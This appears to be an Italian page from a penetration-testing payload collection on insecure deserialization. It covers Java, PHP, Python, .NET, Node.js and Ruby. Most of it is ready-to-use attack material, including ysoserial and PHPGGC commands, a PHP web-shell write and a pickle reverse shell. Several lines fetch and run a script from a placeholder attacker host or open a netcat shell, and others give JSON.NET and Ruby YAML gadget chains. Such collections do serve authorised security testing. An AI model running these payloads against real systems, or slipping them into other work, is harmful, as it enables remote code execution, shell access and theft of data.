# 🔓 Payload di deserializzazione

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Deserialization.tr.md) • [🇬🇷 Ελληνικά](Deserialization.el.md)

> **Nota sugli esempi originali:** Le catene di gadget dipendono da classi, dipendenze e versioni disponibili. Nei campioni PHP alcuni conteggi di byte/stringhe sono incoerenti: vengono conservati come esempi originali, senza renderli eseguibili. Da PHP 8 i metadati Phar non vengono più deserializzati automaticamente all’accesso ([migrazione PHP 8](https://www.php.net/manual/en/migration80.incompatible.php#migration80.incompatible.phar)). Anche i caricamenti YAML/Pickle e i formati .NET dipendono da API, loader e runtime.


```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## ☕ Deserializzazione Java

### Rilevamento
```
# Byte distintivi (magic bytes)
AC ED 00 05    # Oggetto Java serializzato (Base64: rO0AB)
H4sIAAAA       # Compresso con GZip

# Posizioni comuni
- Cookie (con codifica Base64)
- Campi nascosti dei moduli
- ViewState
- Parametri API
- RMI (porta 1099)
- JMX (porta 9010)
```

### ysoserial - Generatore di payload
```bash
# Installazione
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# Genera il payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# Catene di gadget comuni
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

### Payload di esfiltrazione DNS
```bash
# Genera un payload di callback DNS
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# Rilevamento basato su DNS
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

### Librerie comunemente vulnerabili
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

## 🐘 Deserializzazione PHP

### Metodi magici
```php
__construct()    // Creazione dell’oggetto
__destruct()     // Distruzione dell’oggetto
__wakeup()       // Deserializzazione
__sleep()        // Serializzazione
__toString()     // Conversione dell’oggetto in stringa
__call()         // Metodo non accessibile
__get()          // Lettura di una proprietà non accessibile
__set()          // Scrittura di una proprietà non accessibile
```

### Payload di base
```php
// Formato di un oggetto serializzato
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// Oggetto con proprietà
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Array
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

### Confronti con conversione implicita dei tipi (type juggling)
```php
// Aggiramento con il booleano true
O:4:"User":1:{s:8:"password";b:1;}

// Confronto con l'intero 0
O:4:"User":1:{s:8:"password";i:0;}

// Aggiramento tramite confronto di array
O:4:"User":1:{s:8:"password";a:0:{}}
```

### Payload di catene POP
```php
// Scrittura arbitraria di file
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// Esecuzione di comandi tramite __destruct()
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

### PHPGGC - Catene di gadget PHP
```bash
# Installazione
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Elenca i gadget
./phpggc -l

# Genera il payload
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Codifica Base64
./phpggc -b Laravel/RCE1 system "id"

# Codifica URL
./phpggc -u Laravel/RCE1 system "id"

# Con wrapper (PHAR)
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

### Deserializzazione Phar
```php
// I file Phar possono attivare la deserializzazione quando vengono aperti
phar://path/to/phar.phar/internal-file

// Modalità di accesso che attivano phar://
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

## 🐍 Deserializzazione Python (Pickle)

### Payload di base
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

### Payload di reverse shell
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Rilevamento
```
# Byte distintivi (magic bytes)
80 04 95    # Protocollo 4 (Python 3)
80 03       # Protocollo 3
80 02       # Protocollo 2

# Pattern Base64 comuni
gASV        # Protocollo 4
gAN         # Protocollo 3
```

### Deserializzazione YAML (Python)
```yaml
# Caricamento non sicuro con PyYAML
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Comandi multipli
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

## 🔷 Deserializzazione .NET

### Rilevamento
```
# ViewState
Parametro __VIEWSTATE (Base64)

# BinaryFormatter
AAEAAAD/////    # Firma distintiva Base64

# JSON.NET
Campo $type in JSON
```

### ysoserial.net - Generatore di payload
```powershell
# Download
# https://github.com/pwntester/ysoserial.net

# Genera il payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# Gadget comuni
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# Sfruttamento di ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### JSON.NET TypeNameHandling
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

## 🟨 JavaScript/Node.js

### node-serialize
```javascript
// Codice vulnerabile: unserialize(user_input)
// Payload con IIFE (espressione di funzione eseguita immediatamente)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Reverse shell
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

### serialize-javascript
```javascript
// Se eval() viene usato sui dati deserializzati
(function(){require('child_process').execSync('id')})()
```

---

## 🔴 Deserializzazione Ruby

### Marshal.load
```ruby
# Crea il payload
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

## 📋 Checklist dei test

```markdown
□ Identifica il formato di serializzazione (Base64, esadecimale, magic bytes)
□ Determina il linguaggio/framework (Java, PHP, Python, .NET)
□ Individua le versioni vulnerabili delle librerie
□ Genera i payload con lo strumento appropriato
□ Verifica i casi blind con callback DNS/HTTP
□ Verifica la lettura/scrittura di file
□ Verifica l'esecuzione di codice
□ Prova diverse catene di gadget
□ Aggira i filtri (codifica, compressione)
```

---

## 🔗 Riepilogo degli strumenti

| Linguaggio | Strumento | Utilizzo |
|----------|------|-------|
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | Personalizzato | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | Personalizzato | Creazione manuale di payload |

---

## 🔗 Payload correlati

- [Payload SSTI](./SSTI.it.md)
- [Command injection](./Command-Injection.it.md)

---

**Torna ai payload:** [💉 Raccolta di payload](../../README.it.md#category-18)
